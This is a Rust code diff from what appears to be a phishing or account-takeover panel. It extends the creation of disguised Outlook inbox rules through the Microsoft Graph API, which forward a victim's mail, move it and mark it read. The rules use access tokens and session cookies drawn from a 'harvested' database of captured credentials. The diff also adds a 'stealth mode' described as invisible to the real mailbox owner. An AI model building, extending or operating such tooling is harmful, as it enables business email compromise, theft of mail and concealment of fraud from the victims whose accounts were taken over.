@@ -28,9 +28,13 @@ pub struct CreateRuleRequest {
     pub rule_name: String,
     pub condition_subject_contains: Vec<String>,
     pub condition_sender_domain: Vec<String>,
+    pub condition_body_contains: Vec<String>,
+    pub condition_sender_contains: Vec<String>,
     pub action_move_to_folder: Option<String>,
     pub action_forward_to: Option<String>,
+    pub action_mark_as_read: bool,
     pub stop_processing: bool,
+    pub local_only: Option<bool>,
 }
 
 /// Build the Graph API messageRule payload with a disguised display name.
@@ -61,6 +65,20 @@ fn build_rule_payload(req: &CreateRuleRequest) -> serde_json::Value {
         );
     }
 
+    if !req.condition_body_contains.is_empty() {
+        conditions.insert(
+            "bodyContains".to_string(),
+            serde_json::json!(req.condition_body_contains),
+        );
+    }
+
+    if !req.condition_sender_contains.is_empty() {
+        conditions.insert(
+            "senderContains".to_string(),
+            serde_json::json!(req.condition_sender_contains),
+        );
+    }
+
     let mut actions = serde_json::Map::new();
 
     if let Some(folder) = &req.action_move_to_folder {
@@ -79,6 +97,13 @@ fn build_rule_payload(req: &CreateRuleRequest) -> serde_json::Value {
                     "name": forward
                 }
             }]),
+        );
+    }
+
+    if req.action_mark_as_read {
+        actions.insert(
+            "markAsRead".to_string(),
+            serde_json::Value::Bool(true),
         );
     }
 
@@ -197,7 +222,7 @@ pub async fn create_inbox_rule(
         Err(_) => {
             // Fall back to harvested table
             let row: crate::HarvestedToken = sqlx::query_as(
-                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested WHERE id = ?"
+                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at FROM harvested WHERE id = ?"
             )
             .bind(&req.token_id)
             .fetch_one(pool)
@@ -214,6 +239,8 @@ pub async fn create_inbox_rule(
                 created_at: chrono::Utc::now(),
                 scopes: vec!["Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "MailboxSettings.ReadWrite".to_string()],
                 last_refreshed_at: Some(chrono::Utc::now()),
+                account_type: row.account_type.or(row.category),
+                cookie_session: row.cookie_session,
             }
         }
     };
@@ -320,6 +347,46 @@ pub async fn create_rule_handler(
     audit_ctx: crate::audit::AuditContext,
     state: web::Data<AppState>,
 ) -> impl Responder {
+    // STEALTH MODE: If local_only is true, skip Graph API entirely
+    if body.local_only.unwrap_or(false) {
+        eprintln!("[rules] Creating local-only rule for stealth mode");
+        let local_result = create_local_only_rule(&state, &body).await;
+        match local_result {
+            Ok(result) => {
+                let _ = crate::audit::insert_audit_log(
+                    &state.pool,
+                    "rule_created_local",
+                    None,
+                    Some(&body.token_id),
+                    None,
+                    Some(&audit_ctx.ip_address),
+                    Some(&audit_ctx.user_agent),
+                    Some(serde_json::json!({
+                        "rule_name": body.rule_name,
+                        "success": true,
+                        "sync_type": "local_only"
+                    })),
+                    true,
+                ).await;
+                return HttpResponse::Ok().json(serde_json::json!({
+                    "status": "created",
+                    "rule_id": result.rule_id,
+                    "graph_rule_id": null,
+                    "target_folder_id": result.target_folder_id,
+                    "rule_payload": result.payload,
+                    "sync_type": "local_only",
+                    "info": "Stealth mode: Rule created locally only. Invisible to real OWA user."
+                }));
+            }
+            Err(e) => {
+                return HttpResponse::InternalServerError().json(serde_json::json!({
+                    "error": "rule_creation_failed",
+                    "details": format!("{}", e)
+                }));
+            }
+        }
+    }
+
     let client = GraphClient::new();
     let result = create_inbox_rule(&state, &client, &body).await;
 
@@ -448,7 +515,7 @@ pub async fn delete_rule_handler(
             Ok(t) => Some(t),
             Err(_) => {
                 match sqlx::query_as::<_, crate::HarvestedToken>(
-                    "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested WHERE id = ?"
+                    "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at FROM harvested WHERE id = ?"
                 )
                 .bind(&rule.token_id)
                 .fetch_one(&state.pool)
@@ -463,6 +530,8 @@ pub async fn delete_rule_handler(
                         created_at: chrono::Utc::now(),
                         scopes: vec!["Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "MailboxSettings.ReadWrite".to_string()],
                         last_refreshed_at: Some(chrono::Utc::now()),
+                        account_type: row.account_type.or(row.category),
+                        cookie_session: row.cookie_session,
                     }),
                     Err(e) => {
                         eprintln!("[rules] Failed to retrieve token for rule deletion: {}", e);
@@ -532,7 +601,7 @@ pub async fn fetch_graph_rules_handler(
         Err(_) => {
             // Fall back to harvested table
             match sqlx::query_as::<_, crate::HarvestedToken>(
-                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested WHERE id = ?"
+                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at FROM harvested WHERE id = ?"
             )
             .bind(&token_id)
             .fetch_one(&state.pool)
@@ -547,6 +616,8 @@ pub async fn fetch_graph_rules_handler(
                     created_at: chrono::Utc::now(),
                     scopes: vec!["Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "MailboxSettings.ReadWrite".to_string()],
                     last_refreshed_at: Some(chrono::Utc::now()),
+                    account_type: row.account_type.or(row.category),
+                    cookie_session: row.cookie_session,
                 },
                 Err(e) => {
                     return HttpResponse::NotFound().json(serde_json::json!({
